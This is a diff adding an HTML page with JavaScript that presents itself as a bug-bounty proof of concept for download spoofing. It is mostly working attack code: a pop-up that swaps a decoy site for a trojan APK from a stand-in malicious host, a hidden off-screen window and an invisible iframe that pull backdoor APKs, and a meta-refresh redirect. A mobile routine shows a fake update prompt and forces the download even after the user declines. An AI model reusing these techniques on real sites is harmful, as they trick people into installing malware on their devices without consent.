@@ -1,0 +1,303 @@
+<html>
+<head>
+<meta charset="utf-8">
+<style>
+/* Advanced styling */
+.button {
+  background: linear-gradient(45deg, #4CAF50, #45a049);
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 10px;
+  cursor: pointer;
+  border-radius: 8px;
+  transition: transform 0.2s, box-shadow 0.2s;
+  box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+}
+
+.button:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 6px 8px rgba(0,0,0,0.15);
+}
+
+.advanced { background: linear-gradient(45deg, #007bff, #0056b3); }
+.stealth { background: linear-gradient(45deg, #dc3545, #c82333); }
+.mobile { background: linear-gradient(45deg, #ffc107, #e0a800); }
+
+.container {
+  max-width: 800px;
+  margin: 0 auto;
+  padding: 20px;
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+}
+
+.log-container {
+  background: #1a1a1a;
+  color: #00ff00;
+  padding: 15px;
+  border-radius: 5px;
+  margin-top: 20px;
+  max-height: 300px;
+  overflow-y: auto;
+  font-family: 'Courier New', monospace;
+  font-size: 12px;
+}
+
+.log-entry {
+  margin: 5px 0;
+  padding: 3px;
+  border-bottom: 1px solid #333;
+}
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>🔍 VRP - Download Spoofing Proof of Concept</h1>
+  
+  <div class="info">
+    <h3>Testing Scenarios:</h3>
+    <ul>
+      <li>Pop-under dengan delayed APK download</li>
+      <li>Multiple window strategy</li>
+      <li>Stealth download techniques</li>
+      <li>Mobile device auto-detection</li>
+    </ul>
+  </div>
+
+  <center>
+    <div class="button-group">
+      <button class="button" onclick="basicSpoofing()">Basic Spoofing</button>
+      <button class="button advanced" onclick="multiWindowAttack()">Multi-Window Attack</button>
+      <button class="button stealth" onclick="stealthTechniques()">Stealth Techniques</button>
+      <button class="button mobile" onclick="mobileAutoDownload()">Mobile Auto-Download</button>
+    </div>
+  </center>
+
+  <h3>Execution Log:</h3>
+  <div id="log" class="log-container"></div>
+</div>
+
+<script>
+class VRPTestSuite {
+  constructor() {
+    this.logs = [];
+    this.downloadCount = 0;
+    this.maxDownloads = 3; // Safety limit
+  }
+  
+  log(message, type = 'info') {
+    const timestamp = new Date().toLocaleTimeString();
+    const logEntry = {
+      timestamp,
+      message,
+      type
+    };
+    
+    this.logs.push(logEntry);
+    this.updateLogDisplay();
+    
+    console.log(`[VRP-TEST] ${message}`);
+  }
+  
+  updateLogDisplay() {
+    const logContainer = document.getElementById('log');
+    logContainer.innerHTML = this.logs.map(entry => 
+      `<div class="log-entry" style="color: ${this.getColorForType(entry.type)}">
+        [${entry.timestamp}] ${entry.message}
+      </div>`
+    ).join('');
+    
+    logContainer.scrollTop = logContainer.scrollHeight;
+  }
+  
+  getColorForType(type) {
+    const colors = {
+      info: '#00ff00',
+      warning: '#ffff00',
+      error: '#ff4444',
+      success: '#00ffff'
+    };
+    return colors[type] || '#ffffff';
+  }
+  
+  // Basic spoofing technique
+  basicSpoofing() {
+    if (this.downloadCount >= this.maxDownloads) {
+      this.log('Download limit reached', 'warning');
+      return;
+    }
+    
+    this.log('Starting basic spoofing attack...', 'info');
+    
+    // Open legitimate-looking site
+    const popup = window.open(
+      'https://google.com', 
+      'legitimateSite',
+      'width=800,height=600,scrollbars=yes'
+    );
+    
+    this.log('Legitimate site opened in popup', 'info');
+    
+    // Delayed malicious redirect
+    setTimeout(() => {
+      if (popup && !popup.closed) {
+        try {
+          popup.location.href = 'https://malicious-domain.com/trojan.apk';
+          this.log('Popup redirected to malicious APK', 'warning');
+          this.downloadCount++;
+        } catch (e) {
+          this.log(`Redirect failed: ${e.message}`, 'error');
+          this.fallbackDownload();
+        }
+      } else {
+        this.log('Popup blocked or closed, using fallback', 'warning');
+        this.fallbackDownload();
+      }
+    }, 4000);
+  }
+  
+  // Multi-window attack
+  multiWindowAttack() {
+    this.log('Initiating multi-window attack...', 'info');
+    
+    // Window 1: Decoy
+    const decoy = window.open(
+      'https://google.com',
+      'decoyWindow',
+      'width=600,height=400'
+    );
+    
+    // Window 2: Hidden download
+    const downloadWindow = window.open(
+      '',
+      'downloadWindow',
+      'width=100,height=100,left=2000,top=2000'
+    );
+    
+    setTimeout(() => {
+      if (downloadWindow) {
+        downloadWindow.location.href = 'https://evil.com/backdoor.apk';
+        this.log('Hidden download window activated', 'warning');
+      }
+      
+      // Close decoy after some time
+      setTimeout(() => {
+        if (decoy && !decoy.closed) {
+          decoy.close();
+          this.log('Decoy window closed', 'info');
+        }
+      }, 3000);
+      
+    }, 2000);
+  }
+  
+  // Stealth techniques
+  stealthTechniques() {
+    this.log('Activating stealth download techniques...', 'info');
+    
+    // Technique 1: Invisible iframe
+    const iframe = document.createElement('iframe');
+    iframe.style.cssText = 'width:0;height:0;border:0;border:none;visibility:hidden;';
+    iframe.src = 'https://malicious.com/stealth.apk';
+    document.body.appendChild(iframe);
+    this.log('Invisible iframe download initiated', 'warning');
+    
+    // Technique 2: Blob download simulation
+    setTimeout(() => {
+      this.simulateFakeDownload();
+    }, 1500);
+    
+    // Technique 3: Meta refresh redirect
+    setTimeout(() => {
+      this.metaRedirect();
+    }, 3000);
+  }
+  
+  simulateFakeDownload() {
+    const fakeApkData = 'PK\x03\x04 Fake APK content for VRP testing';
+    const blob = new Blob([fakeApkData], { type: 'application/vnd.android.package-archive' });
+    const url = URL.createObjectURL(blob);
+    
+    const link = document.createElement('a');
+    link.href = url;
+    link.download = 'legitimate_app.apk';
+    link.style.display = 'none';
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    URL.revokeObjectURL(url);
+    
+    this.log('Fake APK download simulated', 'success');
+  }
+  
+  metaRedirect() {
+    // Create meta tag for redirect
+    const meta = document.createElement('meta');
+    meta.httpEquiv = 'refresh';
+    meta.content = '0;url=https://malicious.com/redirect.apk';
+    document.head.appendChild(meta);
+    this.log('Meta redirect activated', 'warning');
+  }
+  
+  // Mobile-specific attacks
+  mobileAutoDownload() {
+    const isMobile = this.detectMobile();
+    
+    if (isMobile) {
+      this.log('Mobile device detected - preparing auto-download', 'info');
+      
+      // Simulate user interaction
+      if (confirm('Your device needs an update. Download now?')) {
+        this.log('User consented to download', 'info');
+        this.triggerMobileDownload();
+      } else {
+        this.log('User declined download', 'warning');
+        // Force download after delay anyway (malicious behavior)
+        setTimeout(() => {
+          this.log('Forcing download after user decline', 'error');
+          this.triggerMobileDownload();
+        }, 5000);
+      }
+    } else {
+      this.log('Not a mobile device - mobile attack skipped', 'info');
+    }
+  }
+  
+  detectMobile() {
+    return /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+  }
+  
+  triggerMobileDownload() {
+    // Mobile-specific download techniques
+    window.location.href = 'intent://malicious.com/app.apk#Intent;scheme=https;package=com.android.browser;end';
+    this.log('Mobile deep link download triggered', 'warning');
+  }
+  
+  fallbackDownload() {
+    this.log('Using fallback download method', 'info');
+    window.open('https://malicious.com/fallback.apk', '_blank');
+    this.downloadCount++;
+  }
+}
+
+// Initialize test suite
+const vrpTest = new VRPTestSuite();
+
+// Assign functions to global scope
+function basicSpoofing() { vrpTest.basicSpoofing(); }
+function multiWindowAttack() { vrpTest.multiWindowAttack(); }
+function stealthTechniques() { vrpTest.stealthTechniques(); }
+function mobileAutoDownload() { vrpTest.mobileAutoDownload(); }
+
+// Auto-detect on load
+window.addEventListener('load', () => {
+  vrpTest.log('VRP Testing Environment Initialized', 'success');
+  vrpTest.log(`User Agent: ${navigator.userAgent}`, 'info');
+});
+</script>
+</body>
+</html>
